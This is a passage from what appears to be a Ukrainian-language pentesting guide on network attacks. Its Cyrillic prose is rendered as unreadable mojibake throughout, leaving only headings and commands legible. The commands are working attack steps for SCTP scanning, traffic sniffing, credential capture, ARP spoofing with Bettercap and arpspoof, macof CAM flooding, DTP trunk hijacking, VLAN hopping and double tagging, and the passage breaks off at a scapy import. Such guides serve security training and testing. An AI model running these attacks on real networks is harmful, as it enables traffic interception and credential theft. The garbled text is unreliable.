—Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ —Å–∏–≥–Ω–∞–ª–∏ SS7 —á–µ—Ä–µ–∑ IP-–º–µ—Ä–µ–∂—ñ.

–ü—ñ–¥—Ç—Ä–∏–º–∫–∞ **SCTP** –Ω–∞–¥–∞—î—Ç—å—Å—è —Ä—ñ–∑–Ω–∏–º–∏ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω–∏–º–∏ —Å–∏—Å—Ç–µ–º–∞–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫ **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** —Ç–∞ **VxWorks**, —â–æ —Å–≤—ñ–¥—á–∏—Ç—å –ø—Ä–æ –π–æ–≥–æ —à–∏—Ä–æ–∫–µ –≤–∏–∑–Ω–∞–Ω–Ω—è —Ç–∞ –∫–æ—Ä–∏—Å–Ω—ñ—Å—Ç—å —É —Å—Ñ–µ—Ä—ñ —Ç–µ–ª–µ–∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ–π —Ç–∞ –º–µ—Ä–µ–∂–µ–≤–∏—Ö —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ–π.

–î–≤–∞ —Ä—ñ–∑–Ω—ñ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –¥–ª—è SCTP –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å—Å—è nmap: _-sY_ —Ç–∞ _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **More nmap options**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### –í–∏—è–≤–ª–µ–Ω–Ω—è –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö IP-–∞–¥—Ä–µ—Å

**–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∏, –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä–∏ —Ç–∞ –º–µ—Ä–µ–∂–µ–≤—ñ –ø—Ä–∏—Å—Ç—Ä–æ—ó** —ñ–Ω–æ–¥—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å –Ω–∞ –º–µ—Ä–µ–∂–µ–≤—ñ –∑–∞–ø–∏—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **–Ω–µ–ø—É–±–ª—ñ—á–Ω—ñ –∞–¥—Ä–µ—Å–∏ –¥–∂–µ—Ä–µ–ª–∞**. **tcpdump** –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –ø–∞–∫–µ—Ç—ñ–≤, –æ—Ç—Ä–∏–º–∞–Ω–∏—Ö –∑ –ø—Ä–∏–≤–∞—Ç–Ω–∏—Ö –∞–¥—Ä–µ—Å –ø—ñ–¥ —á–∞—Å —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è. –ó–æ–∫—Ä–µ–º–∞, –Ω–∞ Kali Linux –ø–∞–∫–µ—Ç–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–∞—Ö–æ–ø–ª–µ–Ω—ñ –Ω–∞ **—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ eth2**, —è–∫–∏–π –¥–æ—Å—Ç—É–ø–Ω–∏–π –∑ –ø—É–±–ª—ñ—á–Ω–æ–≥–æ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É. –í–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ —è–∫—â–æ –≤–∞—à–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –∑–∞ NAT –∞–±–æ –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä–æ–º, —Ç–∞–∫—ñ –ø–∞–∫–µ—Ç–∏, –π–º–æ–≤—ñ—Ä–Ω–æ, –±—É–¥—É—Ç—å –≤—ñ–¥—Ñ—ñ–ª—å—Ç—Ä–æ–≤–∞–Ω—ñ.
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing –≤–∏ –º–æ–∂–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –¥–µ—Ç–∞–ª—ñ IP-–¥—ñ–∞–ø–∞–∑–æ–Ω—ñ–≤, —Ä–æ–∑–º—ñ—Ä—ñ–≤ –ø—ñ–¥–º–µ—Ä–µ–∂, MAC-–∞–¥—Ä–µ—Å —Ç–∞ —ñ–º–µ–Ω —Ö–æ—Å—Ç—ñ–≤, –ø–µ—Ä–µ–≥–ª—è–¥–∞—é—á–∏ –∑–∞—Ö–æ–ø–ª–µ–Ω—ñ –∫–∞–¥—Ä–∏ —Ç–∞ –ø–∞–∫–µ—Ç–∏. –Ø–∫—â–æ –º–µ—Ä–µ–∂–∞ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∞ –∞–±–æ –∫–æ–º—É—Ç–∞—Ü—ñ–π–Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –ø—ñ–¥ —Ç–∏—Å–∫–æ–º, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –∑–∞—Ö–æ–ø–∏—Ç–∏ —á—É—Ç–ª–∏–≤—ñ –º–∞—Ç–µ—Ä—ñ–∞–ª–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–∞—Å–∏–≤–Ω–æ–≥–æ –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ sniffing.

–Ø–∫—â–æ –º–µ—Ä–µ–∂–∞ Ethernet –∑ –∫–æ–º—É—Ç–∞—Ü—ñ—î—é –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–æ, –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ –ª–∏—à–µ —à–∏—Ä–æ–∫–æ–º–æ–≤–Ω—ñ –∫–∞–¥—Ä–∏ —Ç–∞ –º–∞—Ç–µ—Ä—ñ–∞–ª–∏, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω—ñ –¥–ª—è –≤–∞—à–æ—ó MAC-–∞–¥—Ä–µ—Å–∏.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
–û–¥–Ω–∏–º —ñ–∑ —Å–ø–æ—Å–æ–±—ñ–≤ —î –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –ø–∞–∫–µ—Ç—ñ–≤ –∑ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ—ó –º–∞—à–∏–Ω–∏ —á–µ—Ä–µ–∑ SSH-—Å–µ—Å—ñ—é –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Wireshark —è–∫ –≥—Ä–∞—Ñ—ñ—á–Ω–æ–≥–æ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

–û—á–µ–≤–∏–¥–Ω–æ.

### Capturing credentials

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz), —â–æ–± –ø–∞—Ä—Å–∏—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∑ pcap –∞–±–æ –∑ –∂–∏–≤–æ–≥–æ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É.

## LAN attacks

### ARP spoofing

ARP Spoofing –ø–æ–ª—è–≥–∞—î –≤ –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—ñ –±–µ–∑–∫–æ—à—Ç–æ–≤–Ω–∏—Ö ARP-–≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏, —â–æ IP –º–∞—à–∏–Ω–∏ –º–∞—î MAC –Ω–∞—à–æ–≥–æ –ø—Ä–∏—Å—Ç—Ä–æ—é. –¢–æ–¥—ñ –∂–µ—Ä—Ç–≤–∞ –∑–º—ñ–Ω–∏—Ç—å ARP-—Ç–∞–±–ª–∏—Ü—é —ñ –±—É–¥–µ –∫–æ–Ω—Ç–∞–∫—Ç—É–≤–∞—Ç–∏ –∑ –Ω–∞—à–æ—é –º–∞—à–∏–Ω–æ—é —â–æ—Ä–∞–∑—É, –∫–æ–ª–∏ –∑–∞—Ö–æ—á–µ –∑–≤'—è–∑–∞—Ç–∏—Å—è –∑ –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–∏–º IP.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

–ü–µ—Ä–µ–ø–æ–≤–Ω–∏—Ç–∏ CAM —Ç–∞–±–ª–∏—Ü—é –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞, –≤—ñ–¥–ø—Ä–∞–≤–ª—è—é—á–∏ –±–∞–≥–∞—Ç–æ –ø–∞–∫–µ—Ç—ñ–≤ –∑ —Ä—ñ–∑–Ω–∏–º–∏ –∞–¥—Ä–µ—Å–∞–º–∏ –¥–∂–µ—Ä–µ–ª–∞ MAC. –ö–æ–ª–∏ CAM —Ç–∞–±–ª–∏—Ü—è –∑–∞–ø–æ–≤–Ω–µ–Ω–∞, –∫–æ–º—É—Ç–∞—Ç–æ—Ä –ø–æ—á–∏–Ω–∞—î –ø–æ–≤–æ–¥–∏—Ç–∏—Å—è —è–∫ —Ö–∞–± (—à–∏—Ä–æ–∫–æ—Å–º—É–≥–æ–≤–æ –ø–µ—Ä–µ–¥–∞—é—á–∏ –≤–µ—Å—å —Ç—Ä–∞—Ñ—ñ–∫).
```bash
macof -i <interface>
```
–£ —Å—É—á–∞—Å–Ω–∏—Ö –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞—Ö —Ü—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –±—É–ª–∞ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–∞.

### 802.1Q VLAN / DTP –ê—Ç–∞–∫–∏

#### –î–∏–Ω–∞–º—ñ—á–Ω–µ –¢—Ä–∞–Ω–∫—É–≤–∞–Ω–Ω—è

**Dynamic Trunking Protocol (DTP)** —Ä–æ–∑—Ä–æ–±–ª–µ–Ω–∏–π —è–∫ –ø—Ä–æ—Ç–æ–∫–æ–ª –∫–∞–Ω–∞–ª—å–Ω–æ–≥–æ —Ä—ñ–≤–Ω—è –¥–ª—è –ø–æ–ª–µ–≥—à–µ–Ω–Ω—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏ —Ç—Ä–∞–Ω–∫—É–≤–∞–Ω–Ω—è, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤–∏–±–∏—Ä–∞—Ç–∏ –ø–æ—Ä—Ç–∏ –¥–ª—è —Ä–µ–∂–∏–º—É —Ç—Ä–∞–Ω–∫—É–≤–∞–Ω–Ω—è (Trunk) –∞–±–æ –Ω–µ—Ç—Ä–∞–Ω–∫—É–≤–∞–ª—å–Ω–æ–≥–æ —Ä–µ–∂–∏–º—É. –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **DTP** —á–∞—Å—Ç–æ –≤–≤–∞–∂–∞—î—Ç—å—Å—è –ø–æ–∫–∞–∑–Ω–∏–∫–æ–º —Å—É–±–æ–ø—Ç–∏–º–∞–ª—å–Ω–æ–≥–æ –¥–∏–∑–∞–π–Ω—É –º–µ—Ä–µ–∂—ñ, –ø—ñ–¥–∫—Ä–µ—Å–ª—é—é—á–∏ –≤–∞–∂–ª–∏–≤—ñ—Å—Ç—å —Ä—É—á–Ω–æ–≥–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ç—Ä–∞–Ω–∫—ñ–≤ –ª–∏—à–µ —Ç–∞–º, –¥–µ —Ü–µ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ, —ñ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –Ω–∞–ª–µ–∂–Ω–æ—ó –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó.

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –ø–æ—Ä—Ç–∏ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –Ω–∞ —Ä–æ–±–æ—Ç—É –≤ —Ä–µ–∂–∏–º—ñ Dynamic Auto, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–æ–Ω–∏ –≥–æ—Ç–æ–≤—ñ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ —Ç—Ä–∞–Ω–∫—É–≤–∞–Ω–Ω—è, —è–∫—â–æ —ó—Ö –∑–∞–ø–∏—Ç–∞—î —Å—É—Å—ñ–¥–Ω—ñ–π –∫–æ–º—É—Ç–∞—Ç–æ—Ä. –ü—Ä–æ–±–ª–µ–º–∞ –±–µ–∑–ø–µ–∫–∏ –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ –ø–µ–Ω—Ç–µ—Å—Ç–µ—Ä –∞–±–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ø—ñ–¥–∫–ª—é—á–∞—î—Ç—å—Å—è –¥–æ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞ —ñ –Ω–∞–¥—Å–∏–ª–∞—î DTP Desirable –∫–∞–¥—Ä, –∑–º—É—à—É—é—á–∏ –ø–æ—Ä—Ç –ø–µ—Ä–µ–π—Ç–∏ –≤ —Ä–µ–∂–∏–º —Ç—Ä–∞–Ω–∫—É–≤–∞–Ω–Ω—è. –¶—è –¥—ñ—è –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤—É–≤–∞—Ç–∏ VLAN —á–µ—Ä–µ–∑ –∞–Ω–∞–ª—ñ–∑ –∫–∞–¥—Ä—ñ–≤ STP —ñ –æ–±—Ö–æ–¥–∏—Ç–∏ —Å–µ–≥–º–µ–Ω—Ç–∞—Ü—ñ—é VLAN, –Ω–∞–ª–∞—à—Ç–æ–≤—É—é—á–∏ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω—ñ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏.

–ù–∞—è–≤–Ω—ñ—Å—Ç—å DTP —É –±–∞–≥–∞—Ç—å–æ—Ö –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞—Ö –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ —Å—É–ø—Ä–æ—Ç–∏–≤–Ω–∏–∫–∞–º–∏ –¥–ª—è —ñ–º—ñ—Ç–∞—Ü—ñ—ó –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º –æ—Ç—Ä–∏–º—É—é—á–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ç—Ä–∞—Ñ—ñ–∫—É —á–µ—Ä–µ–∑ –≤—Å—ñ VLAN. –°–∫—Ä–∏–ø—Ç [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É, –≤–∏—è–≤–ª—è—é—á–∏, —á–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –∫–æ–º—É—Ç–∞—Ç–æ—Ä —É —Ä–µ–∂–∏–º—ñ Default, Trunk, Dynamic, Auto –∞–±–æ Access‚Äî–æ—Å—Ç–∞–Ω–Ω—ñ–π —î —î–¥–∏–Ω–æ—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—î—é, —è–∫–∞ –Ω–µ –ø—ñ–¥–ª—è–≥–∞—î –∞—Ç–∞–∫–∞–º VLAN hopping. –¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –æ—Ü—ñ–Ω—é—î —Å—Ç–∞—Ç—É—Å –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞.

–Ø–∫—â–æ –±—É–¥–µ –≤–∏—è–≤–ª–µ–Ω–æ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –º–µ—Ä–µ–∂—ñ, —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç _**Yersinia**_ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è "—É–≤—ñ–º–∫–Ω–µ–Ω–Ω—è —Ç—Ä–∞–Ω–∫—É–≤–∞–Ω–Ω—è" —á–µ—Ä–µ–∑ –ø—Ä–æ—Ç–æ–∫–æ–ª DTP, —â–æ –¥–æ–∑–≤–æ–ª—è—î —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—Ç–∏ –∑–∞ –ø–∞–∫–µ—Ç–∞–º–∏ –∑ —É—Å—ñ—Ö VLAN.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

–©–æ–± –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ VLAN, —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –∫–∞–¥—Ä DTP Desirable –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–∫—Ä–∏–ø—Ç–∞ [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. –ù**–µ –ø–µ—Ä–µ—Ä–∏–≤–∞–π—Ç–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç–∞ –∑–∞ –∂–æ–¥–Ω–∏—Ö –æ–±—Å—Ç–∞–≤–∏–Ω. –í—ñ–Ω —ñ–Ω–∂–µ–∫—Ç—É—î DTP Desirable –∫–æ–∂–Ω—ñ —Ç—Ä–∏ —Å–µ–∫—É–Ω–¥–∏. **–î–∏–Ω–∞–º—ñ—á–Ω–æ —Å—Ç–≤–æ—Ä–µ–Ω—ñ –∫–∞–Ω–∞–ª–∏ trunk –Ω–∞ –∫–æ–º—É—Ç–∞—Ç–æ—Ä—ñ –∂–∏–≤—É—Ç—å –ª–∏—à–µ –ø'—è—Ç—å —Ö–≤–∏–ª–∏–Ω. –ü—ñ—Å–ª—è –ø'—è—Ç–∏ —Ö–≤–∏–ª–∏–Ω trunk –≤—ñ–¥–∫–ª—é—á–∞—î—Ç—å—Å—è.**
```
sudo python3 DTPHijacking.py --interface eth0
```
–Ø —Ö–æ—Ç—ñ–≤ –±–∏ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ **Access/Desirable (0x03)** –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, —â–æ DTP —Ñ—Ä–µ–π–º —î —Ç–∏–ø—É Desirable, —â–æ –≤–∫–∞–∑—É—î –ø–æ—Ä—Ç—É –ø–µ—Ä–µ–π—Ç–∏ –≤ —Ä–µ–∂–∏–º Trunk. –ê **802.1Q/802.1Q (0xa5)** –≤–∫–∞–∑—É—î –Ω–∞ —Ç–∏–ø —ñ–Ω–∫–∞–ø—Å—É–ª—è—Ü—ñ—ó **802.1Q**.

–ê–Ω–∞–ª—ñ–∑—É—é—á–∏ STP —Ñ—Ä–µ–π–º–∏, **–º–∏ –¥—ñ–∑–Ω–∞—î–º–æ—Å—è –ø—Ä–æ —ñ—Å–Ω—É–≤–∞–Ω–Ω—è VLAN 30 —Ç–∞ VLAN 60.**

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### –ê—Ç–∞–∫–∞ –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ VLAN

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞—î—Ç–µ VLAN ID —Ç–∞ –∑–Ω–∞—á–µ–Ω–Ω—è IP, –≤–∏ –º–æ–∂–µ—Ç–µ **–Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–∏–π —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è –∞—Ç–∞–∫–∏ –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π VLAN**.\
–Ø–∫—â–æ DHCP –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ _ifconfig_ –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Å—Ç–∞—Ç–∏—á–Ω–æ—ó IP-–∞–¥—Ä–µ—Å–∏.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

–û–±–≥–æ–≤–æ—Ä–µ–Ω–∞ –∞—Ç–∞–∫–∞ **Dynamic Trunking —Ç–∞ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–∏—Ö —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ–≤ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ** —ñ–Ω—à–∏—Ö VLAN **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è** —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–º: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

–Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–Ω–∞—î –∑–Ω–∞—á–µ–Ω–Ω—è **MAC, IP —Ç–∞ VLAN ID –∂–µ—Ä—Ç–≤–∏**, –≤—ñ–Ω –º–æ–∂–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–ø–æ–¥–≤—ñ–π–Ω–æ —Ç–µ–≥—É–≤–∞—Ç–∏ –∫–∞–¥—Ä** –∑ –π–æ–≥–æ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–º VLAN —Ç–∞ VLAN –∂–µ—Ä—Ç–≤–∏ —ñ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø–∞–∫–µ—Ç. –û—Å–∫—ñ–ª—å–∫–∏ **–∂–µ—Ä—Ç–≤–∞ –Ω–µ –∑–º–æ–∂–µ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –Ω–∞–∑–∞–¥** –¥–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, **–Ω–∞–π–∫—Ä–∞—â–∏–º –≤–∞—Ä—ñ–∞–Ω—Ç–æ–º –¥–ª—è –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ —î —Å–ø—ñ–ª–∫—É–≤–∞–Ω–Ω—è —á–µ—Ä–µ–∑ UDP** –∑ –ø—Ä–æ—Ç–æ–∫–æ–ª–∞–º–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–µ—è–∫—ñ —Ü—ñ–∫–∞–≤—ñ –¥—ñ—ó (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, SNMP).

–©–µ –æ–¥–∏–Ω –≤–∞—Ä—ñ–∞–Ω—Ç –¥–ª—è –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ - –∑–∞–ø—É—Å—Ç–∏—Ç–∏ **TCP –ø–æ—Ä—Ç —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è, –ø—ñ–¥—Ä–æ–±–ª—è—é—á–∏ IP, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º —ñ –¥–æ—Å—Ç—É–ø–Ω–∏–π –∂–µ—Ä—Ç–≤—ñ** (–º–æ–∂–ª–∏–≤–æ, —á–µ—Ä–µ–∑ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç). –¢–æ–¥—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø–µ—Ä–µ—Ö–æ–ø–∏—Ç–∏ –Ω–∞ –¥—Ä—É–≥–æ–º—É —Ö–æ—Å—Ç—ñ, —â–æ –Ω–∞–ª–µ–∂–∏—Ç—å –π–æ–º—É, —è–∫—â–æ –≤—ñ–Ω –æ—Ç—Ä–∏–º—É—î –¥–µ—è–∫—ñ –ø–∞–∫–µ—Ç–∏ –≤—ñ–¥ –∂–µ—Ä—Ç–≤–∏.

![](<../../.gitbook/assets/image (190).png>)

–©–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ü—é –∞—Ç–∞–∫—É, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ scapy: `pip install scapy`
```python
from scapy.all import *
